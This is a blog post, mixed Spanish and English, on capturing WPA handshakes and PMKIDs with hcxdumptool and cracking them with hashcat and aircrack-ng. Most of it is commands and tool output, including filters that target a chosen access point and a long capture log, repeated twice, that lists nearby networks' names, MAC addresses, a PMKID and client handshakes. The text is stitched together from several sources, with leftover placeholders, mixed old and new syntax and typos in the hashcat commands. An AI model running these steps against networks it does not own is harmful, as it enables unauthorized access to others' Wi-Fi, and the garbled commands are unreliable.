---
title: "Capturar handshakes y ataques PMKID con Hcxdumptool"
date: 2025-02-16T13:16:01-03:00
tags: ['hacking']
---
Al hacer un ataque PMKID no es necesario desautenticar al cliente para capturar el handshake. Este ataque se puede realizar sin clientes.

Este ataque también se puede hacer con Airgeddon.

Es obligatorio detener todos los servicios que acceden a tu interfaz en mi caso: 

```bash
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant
```

Es importante tener la última versión de `hcxdumptool`: 

Desde la versión 6.3.0 las opciones hay cambiados por problemas de rendimiento.  Esto fue mencionado en el changelog.

Para atacar una MAC ADDRESS en específico se crea un Berkeley Packet Filter

Con `airodump` obtenés el BBSID y luego:

```bash
sudo airmon-ng check kill
sudo airodump-ng wlp1s0
```

Just create a Berkeley Packet Filter and add it to hcxdumptool.  Steps to create a simple filter: set monitor mode

```bash
$ hcxdumptool -m INTERFACENAME
```

create the filter (this example use 11:22:33:44:55:66 as target address)

```console
$ sudo tcpdump -i INTERFACENAME wlan addr1 11:22:33:44:55:66 or wlan addr2 11:22:33:44:55:66 or wlan addr3 11:22:33:44:55:66 -ddd > attack.bpf
```

run hcxdumptool with the filter:

```console
$ sudo hcxdumptool -i INTERFACENAME -w dumpfile.pcapng -F --rds=1 --bpf=attack.bpf
```


#### ¿Es posible tener 2 o más direcciones MAC de destino y, en caso afirmativo, qué es la sintaxis correcta?

basic BPF example for two target APs: `AP1 = 11:12:13:14:15:16` `AP2 = 21:22:23:24:25:26` `"wlan addr3 11:12:13:14:15:16 or wlan addr3 21:22:23:24:25:26"`

#### Crear un AP y muchos clientes 

Command line is wrong, because it build tcpdump default snaplen of 65535 bytes while hcxdumptool's snaplen is 1024.

Attack filter on CLIENTs mostly do not work as expected due to MAC randomization by nearly all CLIENTs.

```bash
tcpdump -s 1024 -y IEEE802_11_RADIO wlan addr3 aaaaaaaaaaaa or wlan addr3 bbbbbbbbbbbb or wlan addr1 dddddddddddd or wlan addr2 dddddddddddd or wlan addr1 eeeeeeeeeeee or wlan addr2 eeeeeeeeeeee -ddd > filter.bpf
```

https://github.com/ZerBea/hcxdumptool/discussions/348

---

#### Capturar handshake:

```bash
hcxdumptool -i INTERFACE -w dumpfile.pcapng -F --rds=1
```

Luego de 3 minutos, detené la captura con Control+C y vas a tener los paquetes capturados en tu directorio home: hash.hc22000 y esidist l handshake será guardado en `dumpfile.pcaapng`

Podés intentar romper el handshake usando hashcat:

```bash
hcxpcapngtool -o hash.hc22000 -E wordlist dumpfile.pcapng
hashcat -m 2200 -o wordlist.txt hash.hc2200
```

#### Atacando con aircrack

Aircrack no soporta pcapng asi que tenés que transformarlo usando el siguiente comando:

```bash
tshark -r foo.pcapng -w foo.pcap -F libcap
tcpdump -r dumpfile.pcapng -w foo.pcap
aircrack-ng -w rockyou.txt foo.pcap
```

---

Command summary for Wi-Fi security audit

##### OLD COMMAND ARGUMENTS:

Network interface names:

```bash
hcxdumptool -I
```

##### OLD COMMAND ARGUMENTS:

```bash
hcxdumptool -L
```

A typical command for capturing data:

##### OLD COMMAND ARGUMENTS:

```bash
hcxdumptool -i INTERFACE -o file.pcapng --active_beacon --enable_status=15
```

##### NEW COMMAND ARGUMENTS:

```bash
hcxdumptool -i INTERFACE -w dumpfile.pcapng -F --rds=1
```

Captured wireless frames are saved to dumpfile.pcapng file. Convert this file to hashes:

```bash
hcxpcapngtool -o hash.hc22000 -E wordlist dumpfile.pcapng
```

A hash.hc22000 file with hashes will be created.

To view information about hashes, use the hcxhashtool utility:

```bash
hcxhashtool --info=stdout -i hash.hc22000
```

Dictionary attack:

```bash
hashcat -m 22000 -a 0 hash.hc22000 СЛОВАРЬ.txt
```

Mask attack example:

```bash
hashcat -m 22000 -a 3 hash.hc22000 ?d?d?d?d?d?d?d?d
```

Stop processes that might interfere with handshake and PMKID capturing

Wi-Fi network security audit can be divided into:

* Online attack when the data necessary to decrypt the wireless network password is captured. During this period, you need to be close to the attacked Access Point, while it must be turned on. That is, as if “online”

* and Offline attack when a password is brute-forced. At this time, you can be anywhere, and the Access Point can even be turned off – this will not affect the result of the attack

During the online stage, it is strongly recommended to stop services that may
interfere with the operation of network interfaces:

---

```bash
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant
```

After the capturing of handshakes and PMKID is complete, you can start
NetworkManager again (wpa_supplicant will be started automatically):

sudo systemctl start NetworkManager

Manage wireless network interfaces

The hcxdumptool utility is a versatile utility for viewing the status and managing
network interfaces, and for performing wireless attacks.

To display a list of wireless interfaces, use the command:

hcxdumptool -I

Sample output (yes, I have a collection of adapters based on various chipsets:
Realtek, Atheros, Intel and Mediatek):

wlan interfaces:
c0b6f9daaf3e wlo1 (iwlwifi)
00c0ca96cfcb wlp0s20f0u2 (ath9k_htc) warning:spoofed MAC e20def45c3f8 detected
00c0ca900d9f wlp0s20f0u1 (rt2800usb) warning:spoofed MAC e2b48830044d detected
00c0cab026eb wlp0s20f0u5 (mt76x2u) warning:spoofed MAC 72fe786e01f0 detected

You can get the same result with the command:

iw dev

                                                                      
                                                                      
                                                                      
                                                                      
                                                                      
                                                                      
                                                                      
                                                                      
                                                                      
                                                                      
                                                                      
                                                                      
                                                                      
                                                                      
                                                                      
                                                                      
                                                                      
                                                                      
                                                                      
                                                                      
                                                                      
                                                                      
                                                                      
                                                                      
                                                                      
                                                                      
                                                                      
                                                                      
[hcxdumptool-5]                                                       

With the command like

sudo hcxdumptool -i INTERFACE -C

you can view the channels supported by the wireless adapter.

For instance:

sudo hcxdumptool -i wlp0s20f0u1 -C

                                 
                                 
                                 
                                 
                                 
                                 
                                 
                                 
                                 
                                 
                                 
                                 
                                 
                                 
                                 
                                 
                                 
                                 
                                 
                                 
                                 
                                 
                                 
                                 
                                 
                                 
                                 
                                 
                                 
                                 
[hcxdumptool-6]                  

You can display similar information with the command

iw list

The --check_driver option runs several tests to ensure that the driver supports all
the necessary ioctl() system calls. The driver must support monitor mode and full
package injection, otherwise hcxdumptool will not work properly:

sudo hcxdumptool -i INTERFACE --check_driver

For instance:

sudo hcxdumptool -i wlp0s20f0u1 --check_driver

                                              
                                              
                                              
                                              
                                              
                                              
                                              
                                              
[hcxdumptool-7]                               

The key lines in the output are:

driver tests passed...
all required ioctl() system calls are supported by driver

They mean that this wireless adapter is fully suitable for performing wireless
attacks.

With the --check_injection option, you can run an antenna test and a wireless packet
injection test to determine if the driver supports full packet injection.

                                                       
                                                       
                                                       
                                                       
                                                       
                                                       
[hcxdumptool-9]                                        

The results of this test are unstable, because they depend on a number of factors:
proximity to Access Points and signal quality, which, in turn, can change from
certain interference.

Another way to check if packet injection is working to start the tool with the
--do_rcascan option, the program will list Access Points within range and
INJECTION-RATIO. To obtain results, it is recommended to run the program for at
least 13 * 5 seconds (13 channels, by default, the listening time for each channel
is 5 seconds):

sudo hcxdumptool -i INTERFACE --do_rcascan

For instance:

sudo hcxdumptool -i wlp0s20f0u1 --do_rcascan

                                                                 
                                                                 
                                                                 
                                                                 
                                                                 
                                                                 
                                                                 
                                                                 
                                                                 
                                                                 
                                                                 
                                                                 
                                                                 
                                                                 
[hcxdumptool-3]                                                  

Pay attention to the table header:

 BSSID        FREQ   CH RSSI BEACON RESPONSE ESSID  SCAN-FREQ: 2432 INJECTION-RATIO:  30% [18:59:25]

It has the value INJECTION-RATIO.

If the AP is within your reach, then you can proceed with the attack.

[INS::INS]

If using ioctl() for some reason is not possible with your wireless adapter, then
you can put it into monitor mode in the usual way (the hcxdumptool author recommends
this only as a last resort):

sudo ip link set <INTERFACE> down
sudo iw <INTERFACE> set monitor control
sudo ip link set <INTERFACE> up

Handshakes and PMKID capture

Attack all APs

A typical command for capturing data:

hcxdumptool -i INTERFACE -o FILE.pcapng --active_beacon --enable_status=15

In this command, FILE.pcapng is the file where the captured wireless frames will be
saved.

Example of my command:

sudo hcxdumptool -i wlp0s20f0u2 -o dumpfile.pcapng --active_beacon --enable_status=15

                                                                        
                                                                        
                                                                        
                                                                        
                                                                        
                                                                        
                                                                        
                                                                        
                                                                        
                                                                        
                                                                        
                                                                        
                                                                        
                                                                        
                                                                        
                                                                        
                                                                        
                                                                        
                                                                        
                                                                        
                                                                        
                                                                        
                                                                        
                                                                        
                                                                        
                                                                        
                                                                        
                                                                        
                                                                        
                                                                        
                                                                        
[hcxdumptool-10]                                                        

The default channel switching time is 5 seconds. This is more suitable if you are on
the move, that is, for mobile attacks. If you are located permanently and are not in
a hurry, then the operating time on each channel can be increased, for example, up
to two minutes (option -t SECONDS):

sudo hcxdumptool -i wlp0s20f0u2 -o dumpfile.pcapng --active_beacon --enable_status=15 -t 120

If you do not want your wireless adapter to emit any frames, then specify the
--silent option. This will disable the Deauthentication attack, an attack on clients
without an AP, but will make you invisible (for wireless activity monitoring
devices).

By default, hcxdumptool automatically selects the channels on which it listens and
captures data. With the -c NUMBER option you can choose to set the frequency
(2437,2462,5600,…) or the channel (1,2,3,…). Default: auto frequency/auto range.
Maximum number of entries: 255. Values between 0-1000 are treated as channels and
values >1000 are treated as frequency in MHz

On 5GHz and 6GHz it is recommended to use the frequency instead of the channel
numbers since the channel numbers are not unique here. Standard 802.11 channels
(device, driver and world regulatory domain dependent): https://en.wikipedia.org/
wiki/List_of_WLAN_channels

With the -s NUMBER option you can set a predefined scan list, the following lists
are available:

  • 0 = auto frequency/auto band (default)
  • 1 = 1,6,11,3,5,1,6,11,2,4,1,6,11,7,9,1,6,11,8,10,1,6,11,12,13 (optimized 2.4GHz)
  • 2 = 1,2,3,4,5,6,7,8,9,10,11,12,13 (standard 2.4 GHz)
  • 3 =
    36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,144,149,153,157,161,165
    (standard 5GHz)
  • 4 =
    1,2,3,4,5,6,7,8,9,10,11,12,13,36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,144,149,153,157,161,165
    (standard 2.4GHz/5GHz)

If you want to save the coordinates of the wireless Access Points / track your
movement, then use the options:

--use_gps_device=DEVICE

  • use a GPS device such as /dev/ttyACM0, /dev/ttyUSB0, … (NMEA 0183 standard,
    fields $GPGGA $GPGGA)

--use_gpsd

use GPSD device (NMEA 0183 standard, $GPGGA $GPGGA fields)

--nmea=FILE

save track to file. Format: NMEA 0183 $GPGGA, $GPRMC, $GPWPL

See also: How to use Android phone as GPS sensor in Linux

An example of a program work log:

Expand

 

[INS::INS]

start capturing (stop with ctrl+c)
NMEA 0183 SENTENCE........: N/A
INTERFACE NAME............: wlp0s20f0u2
INTERFACE PROTOCOL........: IEEE 802.11
INTERFACE TX POWER........: 36 dBm (lowest value reported by the device)
INTERFACE HARDWARE MAC....: 00c0ca96cfcb (not used for the attack)
INTERFACE VIRTUAL MAC.....: 00c0ca96cfcb (not used for the attack)
DRIVER....................: ath9k_htc
DRIVER VERSION............: 5.16.8-arch1-1
DRIVER FIRMWARE VERSION...: 1.4
openSSL version...........: 1.1
ERRORMAX..................: 100 errors
BPF code blocks...........: 0
FILTERLIST ACCESS POINT...: 0 entries
FILTERLIST CLIENT.........: 0 entries
FILTERMODE................: unused
WEAK CANDIDATE............: 12345678
ESSID list................: 0 entries
ACCESS POINT (ROGUE)......: 000e1726743a (BROADCAST HIDDEN used for the attack)
ACCESS POINT (ROGUE)......: 000e1726743b (BROADCAST OPEN used for the attack)
ACCESS POINT (ROGUE)......: 000e1726743c (used for the attack and incremented on every new client)
CLIENT (ROGUE)............: b025aac62e0f
EAPOLTIMEOUT..............: 20000 usec
EAPOLEAPTIMEOUT...........: 2500000 usec
REPLAYCOUNT...............: 62969
ANONCE....................: 5630c66168cdb3f4a93da3509541b808afd72bf2e848576f822b8ddd3e6a1006
SNONCE....................: 3f4872fcafb3165345aa603842c7f01039763994419cbd80ada5fa239f7673bf

10:28:24 2412/1   ffffffffffff c891f9c7eff6 RT-728005 [BEACON]
10:28:24 2412/1   ffffffffffff 142e5e5636f0 RT-WiFi-36EE [BEACON]
10:28:24 2412/1   ffffffffffff e4186b1abe4c 114 [BEACON]
10:28:24 2412/1   ffffffffffff e8377a94a520 Keenetic-1606 [BEACON]
10:28:25 2412/1   7aa0dc189b9b c891f9c7eff6 RT-728005 [PROBERESPONSE]
10:28:25 2412/1   7aa0dc189b9b e4186b1abe4c 114 [PROBERESPONSE]
10:28:25 2412/1   ffffffffffff 6466b3489a20 TP-LINK_489A20 [BEACON]
10:28:26 2412/1   ffffffffffff f0b4d29f8889 DIR-615-8888 [BEACON]
10:28:26 2412/1   ffffffffffff bc0f9a24a294 DIR-615-A293 [BEACON]
10:28:28 2412/1   ffffffffffff 78321b502db0 DIR-615 [BEACON]
10:28:28 2412/1   b025aac62e0f c891f9c7eff6 RT-728005 [PMKIDROGUE:7a611b478d7ad30d13f884033de72a6d KDV:2]
10:28:33 2412/1   daa119a3ce9b 6466b3489a20 TP-LINK_489A20 [PROBERESPONSE]
10:28:36 2412/1   d8a98ba2e8f8 f0b4d29f8889 DIR-615-8888 [PROBERESPONSE]
10:28:39 2412/1   304a261d7203 bc0f9a24a294 DIR-615-A293 [PROBERESPONSE]
10:28:48 2412/1   52983911000d e8377a94a520 Keenetic-1606 [PROBERESPONSE]
10:28:52 2412/1   ffffffffffff 24d3f2aa99a5 RT-WiFi_66 [BEACON]
10:29:25 2412/1   4c6371e0e52e 142e5e5636f0 RT-WiFi-36EE [PROBERESPONSE]
10:29:42 2412/1   d8c0a6b19e25 78321b503d48 DIR-615-3D47 [PROBERESPONSE]
10:30:00 2417/2   ffffffffffff d8af817653ce RT-WiFi-53CD [BEACON]
10:30:00 2417/2   ffffffffffff ec43f6dc7d68 Jenechka [BEACON]
10:30:00 2417/2   ffffffffffff 045ea4543b86 [HIDDEN BEACON]
10:30:02 2417/2   402f86f57436 ec43f6dc7d68 Jenechka [PROBERESPONSE]
10:30:08 2417/2   304a261d7203 d8af817653ce RT-WiFi-53CD [PROBERESPONSE]
10:30:11 2417/2   ffffffffffff c471544fbb30 TP-LINK_BB30 [BEACON]
10:30:26 2417/2   9444443388b6 000e1726743e Moto G (5S) Plus 110282 [AUTHENTICATION]
10:30:26 2417/2   9444443388b6 000e1726743e Moto G (5S) Plus 110282 [ASSOCIATION]
10:30:44 2417/2   9444443388b6 000e1726743e Moto G (5S) Plus 110282 [REASSOCIATION]
10:30:57 2417/2   ffffffffffff f8f082b2d0df trytek_76 [BEACON]
10:31:47 2417/2   008e7af12a6e 000e1726743f RT-104 [AUTHENTICATION]
10:31:47 2417/2   008e7af12a6e 000e1726743f RT-104 [ASSOCIATION]
10:31:47 2417/2   008e7af12a6e 000e1726743f RT-104 [EAPOL:M1M2ROGUE EAPOLTIME:169 RC:62969 KDV:2]
10:31:57 2417/2   586356f41838 c471544fbb30 TP-LINK_BB30 [PROBERESPONSE]
10:32:00 2422/3   ffffffffffff f81a67494462 Old'est_WEB [BEACON]
10:32:05 2422/3   daa119f66eb6 e865d48431c1 Tenda_8431C0 [PROBERESPONSE]
10:32:17 2422/3   ffffffffffff e865d48431c1 Tenda_8431C0 [BEACON]
10:32:29 2422/3   f8c39e6a5efc 000e17267440 comfast [AUTHENTICATION]
10:32:29 2422/3   f8c39e6a5efc 000e17267440 comfast [ASSOCIATION]
10:32:34 2422/3   ffffffffffff 90ef68fb8420 Keenetic-4127 [BEACON]
10:33:04 2422/3   008e7af12a6e 000e17267442 BK389 [AUTHENTICATION]
10:33:04 2422/3   008e7af12a6e 000e17267442 BK389 [ASSOCIATION]
10:33:11 2422/3   daa119d8764c f81a67494462 Old'est_WEB [PROBERESPONSE]
10:34:00 2427/4   ffffffffffff 60a4b79e2d8f olga [BEACON]
10:34:00 2427/4   ffffffffffff c04a0032ba74 polosatik [BEACON]
10:34:00 2427/4   ffffffffffff 66a4b79e2d8f [HIDDEN BEACON]
10:34:02 2427/4   40aa569908e5 60a4b79e2d8f olga [PROBERESPONSE]
10:34:02 2427/4   9444443388b6 000e1726743e Moto G (5S) Plus 110282 [EAPOL:M1M2ROGUE EAPOLTIME:110 RC:62969 KDV:2]
10:34:02 2427/4   9444443388b6 000e1726743e Moto G (5S) Plus 110282 [EAPOL:M1M2ROGUE EAPOLTIME:211 RC:62969 KDV:2]
10:34:03 2427/4   0c89106f809f 90ef68fb8420 Keenetic-4127 [PROBERESPONSE]
10:34:20 2427/4   ffffffffffff 58d56edbd6ff DIR-615T-d6fe [BEACON]
10:34:34 2427/4   304a261d7203 c04a0032ba74 polosatik [PROBERESPONSE]
10:35:06 2427/4   24fce57aa499 58d56edbd6ff DIR-615T-d6fe [PROBERESPONSE]
10:35:51 2427/4   9444443388b6 000e1726743e Moto G (5S) Plus 110282 [EAPOL:M1M2ROGUE EAPOLTIME:6016 RC:62969 KDV:2]
10:36:04 2432/5   9444443388b6 000e1726743e Moto G (5S) Plus 110282 [EAPOL:M1M2ROGUE EAPOLTIME:1155 RC:62969 KDV:2]
10:36:04 2432/5   9444443388b6 000e1726743e Moto G (5S) Plus 110282 [EAPOL:M1M2ROGUE EAPOLTIME:1753 RC:62969 KDV:2]
10:36:27 2432/5   9444443388b6 000e1726743e Moto G (5S) Plus 110282 [EAPOL:M1M2ROGUE EAPOLTIME:202 RC:62969 KDV:2]
10:37:39 2432/5   9444443388b6 000e1726743e Moto G (5S) Plus 110282 [EAPOL:M1M2ROGUE EAPOLTIME:2015 RC:62969 KDV:2]
10:38:00 2437/6   ffffffffffff 28285d698a22 Keenetic-9158 [BEACON]
10:38:00 2437/6   ffffffffffff 5404a6c6baf8 ASUS [BEACON]
10:38:05 2437/6   9444443388b6 000e1726743e Moto G (5S) Plus 110282 [EAPOL:M1M2ROGUE EAPOLTIME:305 RC:62969 KDV:2]
10:38:05 2437/6   9444443388b6 000e1726743e Moto G (5S) Plus 110282 [EAPOL:M1M2ROGUE EAPOLTIME:374 RC:62969 KDV:2]
10:38:09 2437/6   5e9f065087b3 5404a6c6baf8 ASUS [PROBERESPONSE]
10:38:23 2437/6   008e7af12a6e 000e17267442 BK389 [EAPOL:M1M2ROGUE EAPOLTIME:3364 RC:62969 KDV:2]
10:38:24 2437/6   ffffffffffff e8377a9a5eec Zyxel7 [BEACON]
10:38:59 2437/6   c83870adbb48 000e1726744c Keenetic-9158 [AUTHENTICATION]
10:38:59 2437/6   c83870adbb48 000e1726744c Keenetic-9158 [REASSOCIATION]
10:39:10 2437/6   c25b1b088ab7 e8377a9a5eec Zyxel7 [PROBERESPONSE]
10:40:02 2442/7   9444443388b6 000e1726743e Moto G (5S) Plus 110282 [EAPOL:M1M2ROGUE EAPOLTIME:1987 RC:62969 KDV:2]
10:40:14 2442/7   ffffffffffff fcf528482fd4 RT-64 [BEACON]
10:40:37 2442/7   0c89106f809f e4186b20f57c RT-104 [PROBERESPONSE]
10:41:17 2442/7   ffffffffffff 8c10d45ea252 ASUS [BEACON]
10:41:33 2442/7   ffffffffffff e4186b20f57c RT-104 [BEACON]
10:42:00 2447/8   ffffffffffff 52ff2042ca83 [HIDDEN BEACON]
10:42:00 2447/8   ffffffffffff 50ff2038858b Keenetic-6515 [BEACON]
10:42:00 2447/8   b8c6aa35393d 50ff2062ca83 Keenetic-8321 [PROBERESPONSE]
10:42:00 2447/8   ffffffffffff 52ff2048858b [HIDDEN BEACON]
10:42:04 2447/8   74dfbf07a943 50ff2038858b Keenetic-6515 [PROBERESPONSE]
10:42:04 2447/8   ffffffffffff 50ff2062ca83 Keenetic-8321 [BEACON]
10:42:05 2447/8   ffffffffffff 50ff20073258 Keenetic [BEACON]
10:42:12 2447/8   ffffffffffff 5cf4abcf3898 Keenetic-0230 [BEACON]
10:42:18 2447/8   74dfbf07a943 000e1726744d pbc [AUTHENTICATION]
10:42:18 2447/8   74dfbf07a943 000e1726744d pbc [ASSOCIATION]
10:43:15 2447/8   ffffffffffff 52ff2049b53b [HIDDEN BEACON]
10:43:21 2447/8   ffffffffffff 50ff2069b53b Keenetic-5575 [BEACON]
10:43:21 2447/8   f63498e66843 50ff2069b53b Keenetic-5575 [PROBERESPONSE]
10:44:04 2452/9   ffffffffffff 50ff20340c5c Guardiwe [BEACON]
10:44:05 2452/9   ffffffffffff 52ff20440c5c [HIDDEN BEACON]
10:44:08 2452/9   e6fda11634b8 28285d698a22 Keenetic-9158 [PROBERESPONSE]
10:44:17 2452/9   ffffffffffff e4186b28a77c Keenetic-2597 [BEACON]
10:44:30 2452/9   ffffffffffff 52ff20430433 [HIDDEN BEACON]
10:44:51 2452/9   9c8c6e7a522b 50ff20340c5c Guardiwe [PROBERESPONSE]
10:44:58 2452/9   1801f1676c56 e4186b28a77c Keenetic-2597 [PROBERESPONSE]
10:45:31 2452/9   daa119ea356f 8c10d45ea252 ASUS [PROBERESPONSE]
10:45:43 2452/9   0c89106f809f 50ff20630433 Keenetic-3643 [PROBERESPONSE]
10:45:54 2452/9   ffffffffffff 50ff20630433 Keenetic-3643 [BEACON]
10:46:01 2457/10  ffffffffffff 142e5e562778 RT-WiFi-17 [BEACON]
10:46:07 2457/10  60d9a0e9b9d8 142e5e562778 RT-WiFi-17 [PROBERESPONSE]
10:46:19 2457/10  0c89106f809f 88a6c6dadcd2 RT-WiFi_2 [PROBERESPONSE]
10:46:31 2457/10  ffffffffffff f07d6895c48a dlink [BEACON]
10:48:00 2462/11  ffffffffffff 9eaed3b01bf5 DIRECT-Ks-EPSON-WF-M5799 Series [BEACON]
10:48:03 2462/11  402f86f57436 9eaed3b01bf5 DIRECT-Ks-EPSON-WF-M5799 Series [PROBERESPONSE]
10:48:05 2462/11  ffffffffffff 28285de857ba wifi110 [BEACON]
10:48:20 2462/11  ffffffffffff e8377a91ddec Keenetic-8836 [BEACON]
10:49:10 2462/11  1801f1347236 ec43f6039d00 [ESSID NOT RECEIVED YET] [AUTHENTICATION]
10:49:10 2462/11  1801f1347236 ec43f6039d00 Keenetic-1768 [ASSOCIATION]
10:49:10 2462/11  1801f1347236 ec43f6039d00 Keenetic-1768 [EAPOL:M1M2ROGUE EAPOLTIME:4251 RC:62969 KDV:2]
10:50:00 2467/12  ffffffffffff 0471535b3b24 RT-WiFi-3B22 [BEACON]
10:50:01 2467/12  7c25da605049 0471535b3b24 RT-WiFi-3B22 [PROBERESPONSE]
10:51:03 2467/12  008e7af12a6e 000e17267442 BK389 [EAPOL:M1M2ROGUE EAPOLTIME:634 RC:62969 KDV:2]
10:51:03 2467/12  008e7af12a6e 000e17267442 BK389 [EAPOL:M1M2ROGUE EAPOLTIME:59 RC:62969 KDV:2]
10:52:00 2472/13  ffffffffffff 78321b4eec98 DIR-615-Svetlana [BEACON]

 

[INS::INS]

start capturing (stop with ctrl+c)
NMEA 0183 SENTENCE........: N/A
INTERFACE NAME............: wlp0s20f0u2
INTERFACE PROTOCOL........: IEEE 802.11
INTERFACE TX POWER........: 36 dBm (lowest value reported by the device)
INTERFACE HARDWARE MAC....: 00c0ca96cfcb (not used for the attack)
INTERFACE VIRTUAL MAC.....: 00c0ca96cfcb (not used for the attack)
DRIVER....................: ath9k_htc
DRIVER VERSION............: 5.16.8-arch1-1
DRIVER FIRMWARE VERSION...: 1.4
openSSL version...........: 1.1
ERRORMAX..................: 100 errors
BPF code blocks...........: 0
FILTERLIST ACCESS POINT...: 0 entries
FILTERLIST CLIENT.........: 0 entries
FILTERMODE................: unused
WEAK CANDIDATE............: 12345678
ESSID list................: 0 entries
ACCESS POINT (ROGUE)......: 000e1726743a (BROADCAST HIDDEN used for the attack)
ACCESS POINT (ROGUE)......: 000e1726743b (BROADCAST OPEN used for the attack)
ACCESS POINT (ROGUE)......: 000e1726743c (used for the attack and incremented on every new client)
CLIENT (ROGUE)............: b025aac62e0f
EAPOLTIMEOUT..............: 20000 usec
EAPOLEAPTIMEOUT...........: 2500000 usec
REPLAYCOUNT...............: 62969
ANONCE....................: 5630c66168cdb3f4a93da3509541b808afd72bf2e848576f822b8ddd3e6a1006
SNONCE....................: 3f4872fcafb3165345aa603842c7f01039763994419cbd80ada5fa239f7673bf

10:28:24 2412/1   ffffffffffff c891f9c7eff6 RT-728005 [BEACON]
10:28:24 2412/1   ffffffffffff 142e5e5636f0 RT-WiFi-36EE [BEACON]
10:28:24 2412/1   ffffffffffff e4186b1abe4c 114 [BEACON]
10:28:24 2412/1   ffffffffffff e8377a94a520 Keenetic-1606 [BEACON]
10:28:25 2412/1   7aa0dc189b9b c891f9c7eff6 RT-728005 [PROBERESPONSE]
10:28:25 2412/1   7aa0dc189b9b e4186b1abe4c 114 [PROBERESPONSE]
10:28:25 2412/1   ffffffffffff 6466b3489a20 TP-LINK_489A20 [BEACON]
10:28:26 2412/1   ffffffffffff f0b4d29f8889 DIR-615-8888 [BEACON]
10:28:26 2412/1   ffffffffffff bc0f9a24a294 DIR-615-A293 [BEACON]
10:28:28 2412/1   ffffffffffff 78321b502db0 DIR-615 [BEACON]
10:28:28 2412/1   b025aac62e0f c891f9c7eff6 RT-728005 [PMKIDROGUE:7a611b478d7ad30d13f884033de72a6d KDV:2]
10:28:33 2412/1   daa119a3ce9b 6466b3489a20 TP-LINK_489A20 [PROBERESPONSE]
10:28:36 2412/1   d8a98ba2e8f8 f0b4d29f8889 DIR-615-8888 [PROBERESPONSE]
10:28:39 2412/1   304a261d7203 bc0f9a24a294 DIR-615-A293 [PROBERESPONSE]
10:28:48 2412/1   52983911000d e8377a94a520 Keenetic-1606 [PROBERESPONSE]
10:28:52 2412/1   ffffffffffff 24d3f2aa99a5 RT-WiFi_66 [BEACON]
10:29:25 2412/1   4c6371e0e52e 142e5e5636f0 RT-WiFi-36EE [PROBERESPONSE]
10:29:42 2412/1   d8c0a6b19e25 78321b503d48 DIR-615-3D47 [PROBERESPONSE]
10:30:00 2417/2   ffffffffffff d8af817653ce RT-WiFi-53CD [BEACON]
10:30:00 2417/2   ffffffffffff ec43f6dc7d68 Jenechka [BEACON]
10:30:00 2417/2   ffffffffffff 045ea4543b86 [HIDDEN BEACON]
10:30:02 2417/2   402f86f57436 ec43f6dc7d68 Jenechka [PROBERESPONSE]
10:30:08 2417/2   304a261d7203 d8af817653ce RT-WiFi-53CD [PROBERESPONSE]
10:30:11 2417/2   ffffffffffff c471544fbb30 TP-LINK_BB30 [BEACON]
10:30:26 2417/2   9444443388b6 000e1726743e Moto G (5S) Plus 110282 [AUTHENTICATION]
10:30:26 2417/2   9444443388b6 000e1726743e Moto G (5S) Plus 110282 [ASSOCIATION]
10:30:44 2417/2   9444443388b6 000e1726743e Moto G (5S) Plus 110282 [REASSOCIATION]
10:30:57 2417/2   ffffffffffff f8f082b2d0df trytek_76 [BEACON]
10:31:47 2417/2   008e7af12a6e 000e1726743f RT-104 [AUTHENTICATION]
10:31:47 2417/2   008e7af12a6e 000e1726743f RT-104 [ASSOCIATION]
10:31:47 2417/2   008e7af12a6e 000e1726743f RT-104 [EAPOL:M1M2ROGUE EAPOLTIME:169 RC:62969 KDV:2]
10:31:57 2417/2   586356f41838 c471544fbb30 TP-LINK_BB30 [PROBERESPONSE]
10:32:00 2422/3   ffffffffffff f81a67494462 Old'est_WEB [BEACON]
10:32:05 2422/3   daa119f66eb6 e865d48431c1 Tenda_8431C0 [PROBERESPONSE]
10:32:17 2422/3   ffffffffffff e865d48431c1 Tenda_8431C0 [BEACON]
10:32:29 2422/3   f8c39e6a5efc 000e17267440 comfast [AUTHENTICATION]
10:32:29 2422/3   f8c39e6a5efc 000e17267440 comfast [ASSOCIATION]
10:32:34 2422/3   ffffffffffff 90ef68fb8420 Keenetic-4127 [BEACON]
10:33:04 2422/3   008e7af12a6e 000e17267442 BK389 [AUTHENTICATION]
10:33:04 2422/3   008e7af12a6e 000e17267442 BK389 [ASSOCIATION]
10:33:11 2422/3   daa119d8764c f81a67494462 Old'est_WEB [PROBERESPONSE]
10:34:00 2427/4   ffffffffffff 60a4b79e2d8f olga [BEACON]
10:34:00 2427/4   ffffffffffff c04a0032ba74 polosatik [BEACON]
10:34:00 2427/4   ffffffffffff 66a4b79e2d8f [HIDDEN BEACON]
10:34:02 2427/4   40aa569908e5 60a4b79e2d8f olga [PROBERESPONSE]
10:34:02 2427/4   9444443388b6 000e1726743e Moto G (5S) Plus 110282 [EAPOL:M1M2ROGUE EAPOLTIME:110 RC:62969 KDV:2]
10:34:02 2427/4   9444443388b6 000e1726743e Moto G (5S) Plus 110282 [EAPOL:M1M2ROGUE EAPOLTIME:211 RC:62969 KDV:2]
10:34:03 2427/4   0c89106f809f 90ef68fb8420 Keenetic-4127 [PROBERESPONSE]
10:34:20 2427/4   ffffffffffff 58d56edbd6ff DIR-615T-d6fe [BEACON]
10:34:34 2427/4   304a261d7203 c04a0032ba74 polosatik [PROBERESPONSE]
10:35:06 2427/4   24fce57aa499 58d56edbd6ff DIR-615T-d6fe [PROBERESPONSE]
10:35:51 2427/4   9444443388b6 000e1726743e Moto G (5S) Plus 110282 [EAPOL:M1M2ROGUE EAPOLTIME:6016 RC:62969 KDV:2]
10:36:04 2432/5   9444443388b6 000e1726743e Moto G (5S) Plus 110282 [EAPOL:M1M2ROGUE EAPOLTIME:1155 RC:62969 KDV:2]
10:36:04 2432/5   9444443388b6 000e1726743e Moto G (5S) Plus 110282 [EAPOL:M1M2ROGUE EAPOLTIME:1753 RC:62969 KDV:2]
10:36:27 2432/5   9444443388b6 000e1726743e Moto G (5S) Plus 110282 [EAPOL:M1M2ROGUE EAPOLTIME:202 RC:62969 KDV:2]
10:37:39 2432/5   9444443388b6 000e1726743e Moto G (5S) Plus 110282 [EAPOL:M1M2ROGUE EAPOLTIME:2015 RC:62969 KDV:2]
10:38:00 2437/6   ffffffffffff 28285d698a22 Keenetic-9158 [BEACON]
10:38:00 2437/6   ffffffffffff 5404a6c6baf8 ASUS [BEACON]
